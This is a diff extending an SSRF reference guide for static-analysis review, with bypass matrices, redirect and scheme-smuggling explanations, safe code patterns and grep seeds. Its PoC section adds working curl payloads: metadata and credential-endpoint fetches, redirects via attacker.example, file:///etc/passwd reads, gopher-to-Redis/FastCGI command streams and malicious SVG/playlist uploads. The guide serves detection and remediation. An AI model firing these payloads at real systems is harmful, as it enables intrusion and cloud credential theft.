@@ -136,11 +136,55 @@ if ipaddress.ip_address(ip).is_private or ip.startswith("169.254."):
 - `http://127.0.0.1` vs `http://0x7f000001` vs `http://[::1]` vs `http://localhost`
 - DNS rebinding: domain resolves to an internal IP address after the initial check completes
 - URL parser differentials: `http://evil.com@127.0.0.1`
-- Redirect chains: an allowlisted URL responds with a redirect to an internal target
+- Redirect (30x) bypass: an allowlisted host responds with a `Location:` to an internal target — covers the full 3xx family plus non-standard codes (e.g. `332`) and `Location`/`Content-Location` on `201`/`200`, not just 301/302 (see "SSRF via Redirect Chain (30x Bypass)")
+- Scheme switch on redirect: `Location: gopher://`/`file://`/`dict://` escapes a scheme allowlist enforced only on the first URL — escalates a read-only fetch to an RCE/LFI primitive
+- Fake-extension / content-type proxy bypass: an allowlisted `…/thumb.jpg` (or `.json`/`.csv`/`.xml`/`.pdf`) redirects to metadata — URL-extension and first-response content-type checks prove nothing about the final host
 - WHATWG vs RFC3986 parser split: backslash treated as path separator in some fetch stacks — `http://allowed.com\@169.254.169.254/` may pass allowlist on one parser while the HTTP client requests the host after `@`
 - Normalize-before-allowlist: blocklist/allowlist applied to raw string before Unicode NFC/NFKC collapse, percent-decoding, or IDNA punycode conversion — attacker smuggles forbidden host through alternate representation
 - Metadata path/fragment: `http://169.254.169.254#@allowed.com` or `http://metadata/expected#@attacker` — validator reads fragment/host differently than fetch client
 - Unicode / IDN / enclosed alphanumerics: fullwidth digits (`１２７.０.０.１`), homoglyphs, `xn--` punycode, or enclosed alphanumeric Unicode (`ⓛⓞⓒⓐⓛⓗⓞⓢⓣ`) bypass ASCII-only blocklists until IDNA normalization
+
+### IP-encoding canonicalization matrix
+
+All of the following resolve to the **same** address (`127.0.0.1` / `169.254.169.254` shown). A validator that string- or regex-matches the host, or checks only dotted-quad form, misses every alternate encoding. The **SAST takeaway**: flag any host/IP check that does not first parse the host to its canonical packed form (4-byte IPv4 / 16-byte IPv6) and then range-check; treat regex/`startswith`/`in`-string host checks as bypassable.
+
+| Encoding | Example (`127.0.0.1`) | Example (`169.254.169.254`) |
+|----------|----------------------|------------------------------|
+| Dotted decimal (canonical) | `127.0.0.1` | `169.254.169.254` |
+| Dotless decimal (32-bit) | `2130706433` | `2852039166` |
+| Dotted hex | `0x7f.0x0.0x0.0x1` | `0xa9.0xfe.0xa9.0xfe` |
+| Dotless hex | `0x7f000001` | `0xa9fea9fe` |
+| Dotted octal | `0177.0.0.01` | `0251.0376.0251.0376` |
+| Padded octal | `00177.00000.00000.000001` | `0000251.0376.0251.0376` |
+| Dotted-decimal overflow (+256) | `383.256.256.257` | `425.510.425.510` |
+| Short / partial form | `127.1`, `0177.1`, `0x7f.1` | `169.254.43518` |
+| Mixed base (hex+oct+dec per octet) | `0x7f.0.0.1`, `0177.0.0x0.1` | `0xa9.0376.43518` |
+| IPv6 compact mapped IPv4 | `[::127.0.0.1]` | `[::169.254.169.254]` |
+| IPv6 v4-mapped | `[::ffff:127.0.0.1]` | `[::ffff:169.254.169.254]` |
+| IPv6 with zone-id suffix | `[::127.0.0.1%2516]` | `[::ffff:169.254.169.254%2516]` |
+| All-zeros / unspecified | `0.0.0.0`, `[::]`, `0` | — |
+
+### Authority-confusion matrix
+
+The host the **validator** parses differs from the host the **HTTP client** connects to, because of userinfo (`@`), delimiters, whitespace, or duplicate markers. Allowed host on the left of the confusion, internal target embedded:
+
+| Trick | Example |
+|-------|---------|
+| Userinfo split | `http://allowed.com@169.254.169.254/` |
+| Double / triple `@` | `http://allowed.com@@169.254.169.254/`, `http://allowed.com@@@169.254.169.254/` |
+| Query / fragment before `@` | `http://169.254.169.254:80?@allowed.com/`, `http://169.254.169.254:80#@allowed.com/` |
+| Combo userinfo+fragment | `http://169.254.169.254:80+&@allowed.com#+@allowed.com/` |
+| Whitespace injection | `http://169.254.169.254%09allowed.com/`, `http://169.254.169.254%2509allowed.com/`, `http://169.254.169.254%20allowed.com/`, backslash-tab variants |
+| Delimiter confusion | `http://169.254.169.254;allowed.com:80/`, `http://169.254.169.254,allowed.com:80/` |
+| Scheme `0://` | `0://169.254.169.254:80;allowed.com:80/` |
+| Port confusion | `http://169.254.169.254:80:80/`, `http://allowed.com:80+&@169.254.169.254:22/` |
+
+### Alternate host separators and Unicode digits
+
+- **Alternate "dots"** normalized to `.` by some resolvers/IDNA: ideographic full stop `。` (U+3002), halfwidth `｡` (U+FF61), fullwidth `．` (U+FF0E) — e.g. `http://169。254。169。254/`, `http://169｡254｡169｡254/`.
+- **Circled / enclosed / styled digit octets**: circled digits (`①②③…`), and mathematical/fullwidth digit families all NFKC-fold to ASCII digits — e.g. `http://⑯⑨。②⑤④。⑯⑨｡②⑤④/`, dotless-hex circled `http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/`, dotless-decimal circled `http://②⑧⑤②⓪③⑨①⑥⑥:80/`.
+- **IDNA mapping abuse**: characters that expand on IDNA/`ToASCII` (e.g. `ß` → `ss`) let an attacker register/route a name that normalizes into an allowlisted or internal host after conversion.
+- **SAST takeaway**: any allowlist/blocklist compared against the raw or once-decoded host is bypassable. Require: parse with one library → IDNA/`ToASCII` encode → NFKC normalize → resolve → canonical-IP range check → pin IP for connect.
 
 ## Business Risk
 - Unauthorized access to internal services such as metadata endpoints and admin panels
@@ -322,34 +366,187 @@ Validators that strip fragments or compare only the pre-`#` portion may approve 
 
 **SAFE**: parse with one library; validate `hostname` from authority only (never fragment); block link-local/metadata IPs after DNS resolution regardless of fragment/userinfo.
 
-## SSRF via Redirect Chain
+## SSRF via Redirect Chain (30x Bypass)
+
+The single most common way to defeat an SSRF allowlist: the attacker controls (or owns) an **allowlisted** host that answers with a redirect (`Location:`) to an internal target. The validator approves the *initial* URL; the HTTP client then **auto-follows** the redirect and connects to the host the validator never saw. Treat any user-controlled fetch that follows redirects without **re-validating every hop** as Likely Vulnerable.
+
+**Status-code breadth** — do not reason about `301`/`302` only. Common clients follow the whole 3xx family — `300, 301, 302, 303, 305, 307, 308` — and permissive clients/`libcurl` follow **non-standard 3xx codes** (e.g. `332`, any `3xx` with a `Location`). A filter or mock that special-cases 301/302 misses the rest.
+
+**307 / 308 preserve method and body** — unlike 301/302/303 (which may downgrade to GET), `307`/`308` replay the **original verb and body** to the redirect target — needed to reach verb-sensitive internal services (POST-only RPC, IMDSv2 `PUT`, Redis/`gopher` payloads carried in a POST body).
+
+**Scheme switch on redirect (high value)** — scheme allowlists enforced only on the *initial* URL are bypassed when `Location:` switches scheme:
+```text
+GET https://allowed.com/avatar.jpg   ->   302 Location: gopher://127.0.0.1:6379/_<redis-payload>
+                                            (or file:///etc/passwd, dict://127.0.0.1:6379/INFO)
+```
+If the client follows cross-scheme redirects, a read-only HTTP fetcher becomes a `gopher`/`file`/`dict` primitive. Cross-ref "Scheme Allowlist / Protocol Smuggling" and `rce.md`.
+
+**Redirect to internal / alternate-encoded host** — `Location:` to `169.254.169.254`, any alternate IP encoding, `instance-data`, `metadata.google.internal`, or a rebinding host. The first-hop allowlist/IP check never runs on the redirect target. Cross-ref the IP-encoding canonicalization matrix.
+
+**Fake-extension / content-type / response-shape bypass** — "image/JSON/CSV/XML/PDF only" proxies that validate the **request URL extension** or the **first response's `Content-Type`** are bypassed because the allowlisted `…/thumb.jpg` (right extension) responds `30x` to metadata. The redirect response can also carry a **spoofed `Content-Type`** and a valid-looking **body** (or no body), defeating checks that "the response looks like a real JPEG/JSON". The extension/content-type proves nothing about the *final* host.
+
+**`Location` honored on non-3xx** — some clients follow `Location` on `201 Created` and `Content-Location` on `200 OK`. A validator that only inspects 3xx responses misses these.
+
+**Non-HTTP protocol redirects** — redirect-following is not HTTP-only: an `RTSP 301`/`Location` (and other line-oriented protocols) likewise sends the client to an internal target. Flag redirect-follow on any protocol client whose target derives from user input.
+
+### Redirect status / response-shape bypass matrix
+
+| Trick | Example (initial → redirect) | Why the filter misses it |
+|-------|------------------------------|--------------------------|
+| Full 3xx family | `200`-only/301-302-only mock vs `303`/`305`/`307`/`308` Location | Validator/test reasons about 301/302 only |
+| Non-standard 3xx | `HTTP/1.1 332` + `Location: http://169.254.169.254/` | libcurl/permissive clients still follow |
+| Method/body preserving | `308 Location: http://169.254.169.254/...` on a POST | 307/308 replay verb+body to internal target |
+| Scheme switch | `302 Location: gopher://127.0.0.1:6379/_…` | Scheme allowlist checked on first URL only |
+| Internal/alt-encoded host | `302 Location: http://0xa9fea9fe/` | Host/IP check never re-runs on `Location` |
+| Fake extension | `GET /thumb.jpg` → `301` → metadata | URL-extension allowlist passes on first hop |
+| Content-type/body spoof | `301` carrying `Content-Type: image/jpeg` + fake body → metadata | Response-shape check trusts the redirect, not final host |
+| `Location` on 201/200 | `201`/`200` + `Location`/`Content-Location` | Validator only inspects 3xx |
+| Non-HTTP redirect | `RTSP/1.0 301 Location: http://169.254.169.254/` | Redirect-follow not limited to HTTP |
+
+### SAST signal and safe pattern
+
+**VULN condition**: a user-controlled outbound fetch where the client **auto-follows redirects** and the destination is validated **only before the first request** (no per-hop re-check). Default-follow clients are the norm — flag them explicitly.
+
+**SAFE**: either disable auto-follow and handle redirects manually, **or** re-validate **every hop** — re-parse `Location` → IDNA/normalize host → re-resolve DNS → block private/link-local/metadata ranges → **re-check the scheme allowlist** → pin the resolved IP for the connect — and cap with a small **max-redirect** limit.
 
 ```java
-// VULNERABLE: HTTP client follows redirects to internal targets
-// Server at https://allowed.com/redirect?to=http://169.254.169.254/
-// returns 302 Location: http://169.254.169.254/
-
-// Java HttpURLConnection follows redirects by default
+// VULNERABLE: defaults follow redirects to internal targets
 URL url = new URL(userInput);
 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-conn.setFollowRedirects(true);  // default — follows 301/302 to internal targets
+conn.setFollowRedirects(true);          // default — follows 3xx (incl. 307/308) to internal
+restTemplate.getForObject(userInput, String.class);   // RestTemplate follows by default
 
-// RestTemplate also follows redirects by default
-restTemplate.getForObject(userInput, String.class);
-
-// SAFE: disable redirect following and handle manually
+// SAFE: disable auto-follow; validate each hop manually before reconnecting
 conn.setInstanceFollowRedirects(false);
 ```
 
-## SSRF to Internal Services (Gopher/File Protocol)
+```python
+# VULN: requests follows redirects by default; only the first URL was checked
+requests.get(user_url)                              # allow_redirects=True by default
+
+# SAFE: no auto-follow; re-validate Location host+scheme+resolved-IP each hop, cap hops
+resp = requests.get(user_url, allow_redirects=False)
+# loop: parse resp.headers["Location"] -> allowlist host -> scheme in {http,https}
+#       -> resolve -> reject private/metadata -> pin IP -> refetch (max N hops)
+```
+
+```javascript
+// VULN: axios/fetch follow redirects by default
+await axios.get(userUrl);
+await fetch(userUrl);                               // redirect: 'follow' (default)
+
+// SAFE: take manual control and re-validate each Location
+await axios.get(userUrl, { maxRedirects: 0 });
+await fetch(userUrl, { redirect: 'manual' });
+```
+
+```go
+// SAFE: reject/re-validate redirects via CheckRedirect (default follows up to 10)
+client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
+    return http.ErrUseLastResponse // or validate req.URL host/scheme/resolved-IP, cap len(via)
+}}
+```
+
+```php
+// VULN: libcurl follows Location and (if enabled) cross-scheme redirects
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+// SAFE: don't auto-follow; if you must, constrain protocols on BOTH initial and redirect
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+curl_setopt($ch, CURLOPT_PROTOCOLS,       CURLPROTO_HTTP | CURLPROTO_HTTPS);
+curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); // blocks redirect->file/gopher
+curl_setopt($ch, CURLOPT_MAXREDIRS,       3);
+```
+
+**Grep seeds** — redirect-following clients on a user-controlled fetch, and validators that check before the fetch but never re-check `Location`:
+```bash
+# default-follow or explicit-follow on outbound clients
+rg -n "allow_redirects\s*=\s*True|setFollowRedirects\(true\)|setInstanceFollowRedirects\(true\)|CURLOPT_FOLLOWLOCATION|maxRedirects|redirect:\s*'follow'|FollowRedirects" --glob '*.{py,js,ts,java,go,php,rb,cs}'
+# follow enabled WITHOUT a redirect-protocol restriction (cross-scheme redirect risk)
+rg -n "CURLOPT_FOLLOWLOCATION" --glob '*.php' | rg -v "CURLOPT_REDIR_PROTOCOLS"
+# host/allowlist validated once, then a separate fetch (no per-hop re-validation)
+rg -n "allowlist|allowed.?hosts|urlparse|new URL\(|url\.Parse" -A6 --glob '*.{py,js,ts,java,go}' | rg -n "requests\.|fetch\(|axios|http\.Get|HttpClient|openConnection"
+```
+**SAFE**: `allow_redirects=False` / `redirect:'manual'` / `maxRedirects:0` / `CheckRedirect`, or re-run the full host+scheme+resolved-IP allowlist on each `Location` with a max-hop cap.
+
+## Scheme Allowlist / Protocol Smuggling
+
+When the client is **not** restricted to `{http, https}`, an attacker swaps the scheme to reach non-HTTP services and escalate beyond a read-only fetch. `java.net.URL.openConnection()` handles `file`, `jar`, `ftp`, `netdoc`; `libcurl` (PHP `curl`, shell-outs) additionally handles `gopher`, `dict`, `ldap`, `tftp`, `smtp`, `imap`, `telnet`; PHP stream wrappers add `php://`, `data://`, `expect://`.
 
 ```java
 // VULNERABLE: URL client that supports non-HTTP schemes
-// Java URL.openConnection() supports: file://, jar://, ftp://
-// If curl is used server-side (via exec), gopher:// may be available
+// Java URL.openConnection() supports: file://, jar://, ftp://, netdoc://
+// If curl is used server-side (via exec), gopher://, dict://, ldap:// may be available
 URL url = new URL(userInput);
 InputStream is = url.openStream();  // file:// reads local files — also SSRF→LFI
 ```
+
+**Escalation map (why scheme restriction matters):**
+
+| Scheme | Reachable service | Impact |
+|--------|-------------------|--------|
+| `gopher://` | Redis, Memcached, FastCGI/PHP-FPM, MySQL, PostgreSQL, SMTP | Arbitrary multiline protocol writes → **RCE** (cron/authorized_keys/webshell, FastCGI `PHP_VALUE`), cache poisoning, mail relay |
+| `dict://` | Redis, Memcached, FTP, any line-oriented service | Single-command probe/write, service fingerprint |
+| `file://` / `netdoc://` | Local filesystem | Local file disclosure (SSRF→LFI) |
+| `ftp://` | FTP + (Java/Python FTP injection) | Firewall pinhole / outbound connection smuggling |
+| `php://`, `data://`, `expect://` | PHP wrapper engine | LFI/RCE when `file_get_contents`/`fopen` take the URL |
+
+`gopher://` is the highest-value escalation because it lets the attacker write **arbitrary bytes with CRLF** to a backend TCP port — Redis `CONFIG SET dir`/`save`, Memcached `set`, and FastCGI records all become RCE primitives. Cross-ref `rce.md`, `path_traversal_lfi_rfi.md`, `php_security.md`.
+
+**SAST takeaway**: require an explicit scheme allowlist (`scheme in {"http","https"}`) **before** the outbound call; flag any client where the scheme is derived from user input or defaulted by the URL parser. Restricting scheme alone is not a full SSRF fix (host still needs allowlisting) but its absence turns SSRF into RCE.
+
+## CRLF / Request Splitting in Outbound URL
+
+A newline (`\r\n`, `%0d%0a`, or raw `\n`) in a user-controlled URL component (host, port, path, or a header value built from the URL) lets the attacker inject additional request headers or smuggle a **second** request to the backend. This is the mechanism behind `gopher://` payloads and also bites plain HTTP clients that do not reject control characters in the URL.
+
+```python
+# VULN: user value with CRLF reaches the request line / headers
+host = request.args["host"]            # "169.254.169.254:80/%0d%0aX-Injected: 1"
+requests.get(f"http://{host}/api")     # splits into attacker-controlled headers
+
+# VULN: port/path concatenation enables protocol injection via gopher/redis
+url = f"gopher://127.0.0.1:6379/_{payload}"  # payload contains %0d%0a Redis commands
+```
+
+**VULN condition**: user input flows into a URL/host/port/path that is passed to an outbound client without rejecting/encoding `\r`, `\n`, `%0d`, `%0a`, `%0d%0a` (and double-encoded `%250d%250a`). Also flag header values built from user-controlled URL parts.
+
+**Unicode-to-latin1 truncation (Node.js <= 8)**: a control-character filter that only rejects literal `\r`/`\n` is bypassable when high-codepoint Unicode characters in the request path truncate to CR/LF bytes as the client serializes the request to the wire (latin1). E.g. `U+010D`/`U+010A` (`č`/`Ċ`) collapse to `0x0D`/`0x0A`, smuggling CRLF and splitting the outbound request. Flag user-controlled Unicode reaching the path of a zero-length-body request (GET/DELETE) on legacy Node; SAFE = build the URL from properly-encoded components and reject non-ASCII in the request target.
+
+**Grep seeds**: `\\r|\\n|%0d|%0a|%0D%0A` adjacent to `requests\.|http\.|fetch\(|curl|urlopen|HttpClient`; f-strings/concatenation building `host:port` or header values from request input.
+
+**SAFE**: reject any URL containing control characters before the request; build outbound requests with a single URL object (never string-concatenate authority); use clients that refuse CR/LF in the request target. Cross-ref `http_response_splitting.md`, `smuggling_desync.md`, `crlf` handling in `correlation_header_injection.md`.
+
+## SVG Rasterization as SSRF Sink
+
+When the server **processes** a user-supplied SVG (thumbnail, preview, PDF export, format conversion via `librsvg`/ImageMagick/Inkscape/headless browser/`resvg`), external references inside the SVG fire as **server-side** outbound requests (and local file reads). The upload looks like an image; the rasterizer is the SSRF sink.
+
+```xml
+<!-- VULN: each of these fetches server-side when the SVG is rendered -->
+<image xlink:href="http://169.254.169.254/latest/meta-data/" .../>      <!-- raster image ref -->
+<?xml-stylesheet type="text/css" href="http://169.254.169.254/"?>       <!-- stylesheet ref -->
+<pattern><image xlink:href="http://127.0.0.1:6379/"/></pattern>        <!-- pattern fill ref -->
+<style>@font-face{font-family:x;src:url('http://169.254.169.254/')}</style>  <!-- font ref -->
+```
+
+**VULN condition**: user-uploaded/POSTed SVG (or any XML the renderer treats as SVG) is rendered server-side without disabling external resource loading. SVG is also XML — the same input can carry XXE (cross-ref `xxe.md`) and, if served inline to a browser, stored XSS (cross-ref `xss.md`).
+
+**Grep seeds**: `rsvg|imagemagick|convert .*\.svg|inkscape|resvg|puppeteer|playwright|wkhtmlto|cairosvg|svg2(png|pdf)`; upload handlers accepting `image/svg+xml`.
+
+**SAFE**: disable external entity/resource loading in the renderer (e.g. ImageMagick policy.xml denying `URL`/`HTTPS`/`MSL`/`text`; `cairosvg`/`resvg` with remote fetch off); sanitize SVG (strip `href`/`xlink:href`/`xml-stylesheet`/`@font-face`/external `url()`); rasterize in a network-isolated sandbox. Cross-ref `arbitrary_file_upload.md`.
+
+## Media / Document Converter SSRF
+
+Converters that parse a user-supplied media or document file follow embedded URLs/playlists/segment lists server-side — SSRF plus local file disclosure, no URL parameter required.
+
+- **ffmpeg / video converters**: HLS `.m3u8` playlists and crafted `.avi`/container files reference external or `file:`/`concat:`/`http:` segments — ffmpeg fetches them and can splice local files into the output (`file_reading` AVI trick).
+- **ImageMagick**: MVG/MSL and SVG delegates with `url(...)`, `image:`/`https:` directives reach remote and local resources (cross-ref `rce.md` for delegate command injection).
+- **PDF / office / HTML-to-X renderers**: remote images, stylesheets, XInclude, or `<iframe>`/`<img>` in the source document are fetched during conversion.
+
+**VULN condition**: user controls the file (or a URL inside it) handed to a converter that resolves embedded references, with no scheme/host restriction on those references.
+
+**Grep seeds**: `ffmpeg|m3u8|concat:|libavformat`; `convert |mogrify|MagickWand|Image::Magick`; `wkhtmltopdf|weasyprint|libreoffice|unoconv|gotenberg|prince`.
+
+**SAFE**: convert with remote/non-essential protocols disabled (ffmpeg `-protocol_whitelist file,crypto` scoped tightly; ImageMagick policy.xml; PDF renderer with remote fetch disabled); run converters in a sandbox with no egress and no sensitive filesystem access.
 
 ## Java Additional SSRF Sinks
 
@@ -376,13 +573,21 @@ client.execute(get);
 ## SSRF in Cloud/Kubernetes Environments — Additional Targets
 
 When running on cloud/k8s, these internal URLs are high-value SSRF targets:
-- `http://169.254.169.254/` — AWS/Azure/GCP instance metadata
-- `http://100.100.100.200/` — Alibaba Cloud metadata
+- `http://169.254.169.254/` — AWS/Azure/GCP instance metadata (the shared link-local IP)
+- `http://instance-data/latest/meta-data/` — AWS hostname alias for the metadata IP (bypasses IP-string blocklists)
+- `http://169.254.170.2/v2/credentials/` — AWS ECS/Fargate task-role credentials endpoint
+- `http://metadata.google.internal/computeMetadata/v1/...?recursive=true` — GCP (header `Metadata-Flavor: Google`; recursive pulls whole subtrees)
+- `http://100.100.100.200/latest/meta-data/` — Alibaba Cloud metadata
+- `http://169.254.169.254/metadata/v1.json` — DigitalOcean (no header)
+- `http://169.254.169.254/opc/v1/instance/` and `http://192.0.0.192/latest/meta-data/` — Oracle Cloud (two distinct endpoints/IPs)
+- `http://metadata.tencentyun.com/latest/meta-data/` — Tencent Cloud
+- `http://169.254.169.254/openstack/latest/meta_data.json` — OpenStack / Huawei Cloud
+- `https://metadata.packet.net/userdata` — Equinix Metal / Packet
 - `http://kubernetes.default.svc/` — K8s API server (internal)
 - `http://10.0.0.1/` — typical internal gateway
 - Redis on `redis://localhost:6379` — via gopher:// if supported
 
-Flag any user-controlled URL fetch where these are not explicitly blocked.
+Flag any user-controlled URL fetch where these are not explicitly blocked. Note that hostname aliases (`instance-data`, `metadata.google.internal`, `metadata.tencentyun.com`) and the alternate IPs (`169.254.170.2`, `100.100.100.200`, `192.0.0.192`) defeat blocklists that only string-match `169.254.169.254`. Cross-ref `kubernetes_cloud_security.md`.
 
 ## URL-Fetch / Media-Proxy SSRF (`url=` parameter pattern)
 
@@ -448,6 +653,28 @@ requests.get(request.headers.get('Referer'))
 
 **SAFE**: derive the base URL from server config/environment (e.g. `process.env.PUBLIC_URL`), not from request headers; validate `Host`/`X-Forwarded-Host` against an allowlist before use.
 
+### Overly-permissive reverse proxy (Host-routed upstream)
+
+A reverse proxy whose **upstream is derived from the request** turns the proxy itself into an SSRF primitive — the attacker sets the `Host` header (or a path/variable the proxy interpolates) and the proxy forwards to an internal target.
+
+```nginx
+# VULN: upstream built from the client-controlled Host header
+location / {
+    proxy_pass http://$http_host;          # attacker: Host: 169.254.169.254
+}
+# VULN: upstream taken from a request variable / path segment
+location /proxy/ {
+    proxy_pass http://$arg_target;          # ?target=169.254.169.254
+}
+```
+
+```bash
+# Equivalent at the wire level: open proxy routes by Host header
+curl http://target/latest/meta-data/ -H "Host: 169.254.169.254"
+```
+
+**VULN condition**: `proxy_pass`/`ProxyPass`/upstream address contains a variable fed by `$http_host`, `$host`, `$arg_*`, `$request_uri`, or a user path segment with no allowlist. **SAFE**: hardcode upstreams (or map through a fixed allowlist), and set the upstream `Host` from config, not the inbound header. Cross-ref `nginx_security.md`, `reverse_proxy_access_bypass.md`, `host_header_poisoning.md`.
+
 **Recognized sanitizers summary**: hostname-sanitizing prefixes, allowlist/`contains` guards, host equality checks, regexp barriers, fixed-prefix string construction (Python partial), `encodeURIComponent` (JS), redirect-check helpers (Go), `AntiSSRF` validators (Python), models-as-data `request-forgery` barriers.
 
 ## GraphQL Resolver SSRF
@@ -478,6 +705,27 @@ def resolve_fetch(parent, info, scheme, host, port, path):
 ```
 
 **SAFE**: same as general SSRF — strict hostname allowlist, resolve-then-validate IP with pinning, scheme restricted to `https`, user input never as authority; apply at resolver boundary before any outbound call. Cross-ref `graphql_injection.md` (resolver-layer injection vs document injection).
+
+## Blind SSRF — Internal Gadget / Impact Catalog
+
+Even a **blind** SSRF (no response body returned) escalates when it can reach an internal service. Use this to judge severity in triage and to justify scheme/port restrictions in remediation — a "harmless" blind fetcher on a host that can talk to Redis or FastCGI is effectively RCE.
+
+| Internal gadget | Reached via | Escalation |
+|-----------------|-------------|------------|
+| Redis | `gopher://`/`dict://` :6379 | RCE — `CONFIG SET dir`+`save` to cron/`authorized_keys`/webshell |
+| Memcached | `gopher://`/`dict://` :11211 | Cache poisoning, object-injection → RCE in some apps |
+| FastCGI / PHP-FPM | `gopher://` :9000 | RCE via `PHP_VALUE` (`auto_prepend_file`, `allow_url_include`) |
+| MySQL / PostgreSQL | `gopher://` :3306 / :5432 | Auth-less query execution where trust-local is configured |
+| Docker API | `http://` :2375 / unix socket | Container create/exec → host RCE |
+| Kubernetes API / kubelet | `https://` kube-api / :10250 | Pod exec, secret read → cluster takeover |
+| Consul / Nomad | `http://` :8500 / :4646 | Service/script registration → RCE |
+| Elasticsearch / Solr | `http://` :9200 / :8983 | Data read; Solr DataImportHandler/velocity → RCE; Solr XXE |
+| Jenkins / Hudson | `http://` :8080 | Script console → RCE |
+| Spring Boot Actuator | `http://` `/actuator/*` | Heap/env dump (creds), `/jolokia` → RCE |
+| App servers (WebLogic/JBoss/Struts) | `http://` internal | Known unauth RCE chains (often CRLF-assisted) |
+| Metrics exporters (Prometheus/Grafana) | `http://` exporter port | Data-source SSRF pivot (e.g. CVE-2020-13379) |
+
+**SAST takeaway**: severity of any user-controlled outbound fetch should assume these gadgets are reachable unless egress is network-restricted; the presence of `gopher`/`dict`/`file` scheme support escalates blind SSRF to RCE-class.
 
 ## Dynamic Test / PoC
 
@@ -522,11 +770,28 @@ curl "https://app.example.com/fetch?url=http://169.254.169.254/metadata/instance
 
 **Filter bypass (when blocklist/allowlist checks hostname only)**
 ```bash
-curl "https://app.example.com/fetch?url=http://2130706433/"              # decimal 127.0.0.1
-curl "https://app.example.com/fetch?url=http://0x7f000001/"              # hex 127.0.0.1
-curl "https://app.example.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"  # URL-encoded 127.0.0.1
-curl "https://app.example.com/fetch?url=http://rebind.127.0.0.1.nip.io/" # DNS rebinding helper
-curl "https://app.example.com/fetch?url=http://ATTACKER/redirect?to=http://169.254.169.254/"
+# Alternate IP encodings of 169.254.169.254 (metadata)
+curl "https://app.example.com/fetch?url=http://2852039166/"             # dotless decimal
+curl "https://app.example.com/fetch?url=http://0xa9fea9fe/"             # dotless hex
+curl "https://app.example.com/fetch?url=http://0251.0376.0251.0376/"    # dotted octal
+curl "https://app.example.com/fetch?url=http://[::ffff:169.254.169.254]/"  # IPv6 v4-mapped
+curl "https://app.example.com/fetch?url=http://169.254.169.254.nip.io/" # wildcard-DNS helper
+# Alternate encodings of 127.0.0.1 (loopback)
+curl "https://app.example.com/fetch?url=http://2130706433/"             # decimal
+curl "https://app.example.com/fetch?url=http://0x7f000001/"             # hex
+curl "https://app.example.com/fetch?url=http://127.1/"                  # short form
+curl "https://app.example.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"  # URL-encoded
+# Authority / parser confusion (allowlisted host on the left)
+curl "https://app.example.com/fetch?url=http://allowed.com@169.254.169.254/"
+curl "https://app.example.com/fetch?url=http://169.254.169.254%2509allowed.com/"
+curl "https://app.example.com/fetch?url=http://allowed.com\\@169.254.169.254/"
+# Redirect + rebinding chains (allowlisted host 30x-redirects to the internal target)
+curl "https://app.example.com/fetch?url=http://attacker.example/redirect?to=http://169.254.169.254/"
+# Scheme switch on redirect: allowlisted http(s) host returns Location: gopher:// (escapes scheme allowlist)
+curl "https://app.example.com/fetch?url=http://attacker.example/r?to=gopher://127.0.0.1:6379/_INFO"
+# Fake extension: allowlisted ...jpg passes an image-only check, then 30x-redirects to metadata
+curl "https://app.example.com/fetch?url=http://attacker.example/thumb.jpg"   # responds 301 Location: http://169.254.169.254/latest/meta-data/
+# Non-standard 3xx code (e.g. 332) — set your redirector to emit it; permissive clients still follow
 # Expect: same internal/metadata content as direct 127.0.0.1 or 169.254.169.254 probes
 ```
 
@@ -536,6 +801,38 @@ curl "https://app.example.com/fetch?url=gopher://127.0.0.1:6379/_INFO"
 # Expect: Redis INFO banner or protocol-specific response
 curl "https://app.example.com/fetch?url=dict://127.0.0.1:6379/INFO"
 # dict:// — line-oriented probe of Redis/memcached/FTP-style services when gopher:// is unavailable
+curl "https://app.example.com/fetch?url=file:///etc/passwd"
+# file:// — local file disclosure (SSRF->LFI) when the client supports it
+```
+
+**Protocol smuggling via gopher (RCE primitives — write multiline backend commands)**
+```bash
+# Redis: CRLF-encoded command stream → CONFIG SET dir/dbfilename + SAVE (cron/authorized_keys/webshell)
+curl "https://app.example.com/fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A..."
+# FastCGI/PHP-FPM: gopher to :9000 with PHP_VALUE (auto_prepend_file=php://input) → RCE
+curl "https://app.example.com/fetch?url=gopher://127.0.0.1:9000/_%01%01..."
+# Expect: side effect on the backend (key written, file created); blind — confirm via OAST or behavior
+```
+
+**SVG / media-converter SSRF (upload-driven, no url= parameter)**
+```bash
+# Upload an SVG whose external ref points at metadata; server-side rasterizer fetches it
+printf '%s' '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>' > poc.svg
+curl -F "file=@poc.svg" "https://app.example.com/upload-avatar"
+# HLS playlist handed to a video converter pulls an attacker/internal segment
+printf '%s\n' '#EXTM3U' '#EXTINF:1,' 'http://169.254.169.254/latest/meta-data/' > poc.m3u8
+curl -F "file=@poc.m3u8" "https://app.example.com/convert"
+# Expect: OAST callback / metadata content embedded in the rendered output
+```
+
+**Broadened cloud metadata (provider-specific)**
+```bash
+curl "https://app.example.com/fetch?url=http://instance-data/latest/meta-data/"              # AWS hostname alias
+curl "https://app.example.com/fetch?url=http://169.254.170.2/v2/credentials/"                # AWS ECS task role
+curl "https://app.example.com/fetch?url=http://169.254.169.254/metadata/v1.json"             # DigitalOcean
+curl "https://app.example.com/fetch?url=http://169.254.169.254/opc/v1/instance/"             # Oracle Cloud
+curl "https://app.example.com/fetch?url=http://metadata.tencentyun.com/latest/meta-data/"    # Tencent Cloud
+curl "https://app.example.com/fetch?url=http://169.254.169.254/openstack/latest/meta_data.json"  # OpenStack/Huawei
 ```
 
 **Internal port scan (timing/status oracle)**
